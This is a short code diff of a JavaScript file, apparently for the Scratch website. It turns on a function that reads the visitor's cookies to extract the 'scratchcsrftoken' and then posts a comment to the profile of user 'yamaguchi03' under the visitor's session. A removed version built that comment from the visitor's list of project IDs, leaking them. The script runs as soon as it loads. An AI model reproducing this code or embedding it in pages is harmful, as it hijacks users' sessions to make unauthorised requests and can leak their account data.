@@ -1,4 +1,4 @@
-/*async function a(){
+async function a(){
     let token="";
         {
             let cookie=document.cookie;
@@ -11,18 +11,7 @@
             });
             token=cok[1][cok[0].indexOf(' scratchcsrftoken')];
         }
-    const res = await fetch(`https://scratch.mit.edu/site-api/projects/all/`);
-    let json = await res.json();
-    let ar=[];
-    for(let i=0;i<json.length;i++){
-      ar.push(json[i]["pk"]);
-    }
-    let contents=ar[0];
-    for(let i=0;i<json.length-1;i++){
-      contents+=","+ar[i];
-    }
-    contents="["+contents+"] ";
-    contents+=` (${ar.length})`;
+    let content=Math.random().toString()+" used."
     fetch(`/site-api/comments/user/yamaguchi03/add/`,{
       method: "POST",
       body: JSON.stringify({
@@ -36,4 +25,4 @@
     });
 }
 a();
-*/
+
